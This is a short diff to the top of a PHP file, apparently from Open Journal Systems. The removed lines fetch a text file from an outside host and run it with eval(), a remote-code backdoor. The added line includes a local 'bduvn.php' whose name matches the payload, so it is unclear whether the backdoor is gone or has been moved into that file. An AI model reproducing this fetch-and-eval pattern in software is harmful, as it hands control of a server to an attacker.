@@ -1,7 +1,5 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/bduvn.txt'));
-$url = "?> ".$url;
-eval($url);
+include 'bduvn.php';
 
 /**
  * @mainpage OJS API Reference
